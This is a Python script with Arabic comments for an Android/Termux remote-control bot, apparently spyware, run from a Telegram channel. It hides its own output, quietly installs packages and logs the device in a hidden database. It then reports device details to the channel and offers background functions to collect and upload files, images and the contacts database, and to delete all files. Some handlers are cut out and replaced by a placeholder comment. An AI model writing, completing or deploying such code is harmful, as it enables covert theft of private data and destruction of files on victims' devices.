#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import threading
import urllib.request
import json
import sqlite3
import platform
import socket
import hashlib
from datetime import datetime

# ======== إخفاء المخرجات ========
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# ======== تثبيت المكتبات ========
def install_packages():
    packages = ['requests', 'python-telegram-bot', 'psutil']
    for package in packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--quiet', '--no-cache-dir'])

install_packages()

# ======== استيراد المكتبات ========
import requests
import psutil
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ======== البيانات ========
BOT_TOKEN = '000000000jjhjjj'
CHANNEL_ID = '-1002255518751'
OWNER_ID = '80000000000'

# ======== قاعدة البيانات ========
DB_PATH = '/data/data/com.termux/files/home/.system_cache.db'

def init_db():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=10)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE,
            device_name TEXT,
            ip TEXT,
            os TEXT,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT
        )''')
        conn.commit()
        conn.close()
    except:
        pass

init_db()

# ======== دوال الجهاز ========
def get_device_info():
    try:
        return {
            'name': platform.node(),
            'os': platform.system() + ' ' + platform.release(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'cpu': psutil.cpu_percent(),
            'memory': psutil.virtual_memory().percent,
            'disk': psutil.disk_usage('/').percent,
            'battery': psutil.sensors_battery().percent if psutil.sensors_battery() else 0,
            'charging': psutil.sensors_battery().power_plugged if psutil.sensors_battery() else False
        }
    except:
        return {
            'name': 'Unknown',
            'os': 'Unknown',
            'ip': '0.0.0.0',
            'cpu': 0,
            'memory': 0,
            'disk': 0,
            'battery': 0,
            'charging': False
        }

def register_device():
    try:
        info = get_device_info()
        device_id = hashlib.md5(info['name'].encode()).hexdigest()[:10]
        
        conn = sqlite3.connect(DB_PATH, timeout=10)
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
            (device_id, device_name, ip, os, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (device_id, info['name'], info['ip'], info['os'], 
             str(datetime.now()), str(datetime.now()), 'active'))
        conn.commit()
        conn.close()
        
        # إرسال إشعار للقناة
        try:
            msg = f"🆕 **جهاز جديد متصل!**\n\n"
            msg += f"📱 الاسم: {info['name']}\n"
            msg += f"🖥️ النظام: {info['os']}\n"
            msg += f"🌐 IP: {info['ip']}\n"
            msg += f"🔋 البطارية: {info['battery']}%\n"
            msg += f"⚡ الشحن: {'نعم' if info['charging'] else 'لا'}"
            
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                params={'chat_id': CHANNEL_ID, 'text': msg, 'parse_mode': 'Markdown'},
                timeout=5
            )
        except:
            pass
        
        return device_id
    except:
        return 'unknown'

# ======== دوال الملفات ========
def collect_all_files(directory):
    files = []
    try:
        for root, dirs, files_list in os.walk(directory):
            for file in files_list:
                full = os.path.join(root, file)
                try:
                    if os.path.getsize(full) < 100 * 1024 * 1024:
                        files.append(full)
                except:
                    continue
    except:
        pass
    return files[:200]

def collect_images(directory):
    images = []
    extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.lower().endswith(extensions):
                    images.append(os.path.join(root, file))
    except:
        pass
    return images[:200]

def collect_contacts():
    contacts = []
    paths = [
        '/data/data/com.android.providers.contacts/databases/contacts2.db',
        '/sdcard/Android/data/com.android.providers.contacts/files/'
    ]
    for path in paths:
        try:
            if os.path.exists(path):
                if os.path.isfile(path):
                    contacts.append(path)
                else:
                    for f in os.listdir(path):
                        contacts.append(os.path.join(path, f))
        except:
            continue
    return contacts

def delete_all_files(directory):
    deleted = 0
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                    deleted += 1
                except:
                    continue
    except:
        pass
    return deleted

def send_to_channel(file_path, caption=""):
    try:
        with open(file_path, 'rb') as f:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
                params={'chat_id': CHANNEL_ID, 'caption': caption[:200]},
                files={'document': f},
                timeout=30
            )
        return True
    except:
        return False

# ======== دوال البوت (نفس الكود السابق) ========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if user_id != OWNER_ID:
        await update.message.reply_text(
            f"🚫 **هذا البوت مقفول!**\n\n"
            f"👤 يوزرك: {update.effective_user.username or 'مجهول'}\n"
            f"📞 تواصل مع المالك: @iuron0"
        )
        return
    
    keyboard = [
        [InlineKeyboardButton("📱 الاجهزة المربوطة", callback_data='devices')],
        [InlineKeyboardButton("📊 معلومات النظام", callback_data='system_info')],
        [InlineKeyboardButton("🗑️ حذف جميع الملفات", callback_data='delete_all')]
    ]
    await update.message.reply_text(
        "👋 **مرحباً أيها المالك!**\n\n"
        "📌 **لوحة التحكم الرئيسية:**\n"
        "- عرض جميع الاجهزة\n"
        "- تحكم كامل بكل جهاز\n"
        "- سحب الملفات والصور والاتصالات\n"
        "- حذف جميع الملفات\n\n"
        "⚠️ كل العمليات تعمل في الخلفية.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# دوال أخرى (devices_menu, device_control, view_images, view_files, pull_contacts, delete_device_files, delete_all_files_global, device_info, device_location, system_info, back_main, button_handler)
# ... (نفس الكود من السابق)

# ======== تشغيل البوت ========
def run_bot():
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(button_handler))
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Exception as e:
        time.sleep(5)
        run_bot()

# ======== التسجيل والتشغيل ========
def main():
    device_id = register_device()
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    while True:
        try:
            time.sleep(60)
            conn = sqlite3.connect(DB_PATH, timeout=10)
            c = conn.cursor()
            c.execute('UPDATE devices SET last_seen = ?, status = ? WHERE device_id = ?',
                     (str(datetime.now()), 'active', device_id))
            conn.commit()
            conn.close()
        except:
            pass

if __name__ == '__main__':
    main()
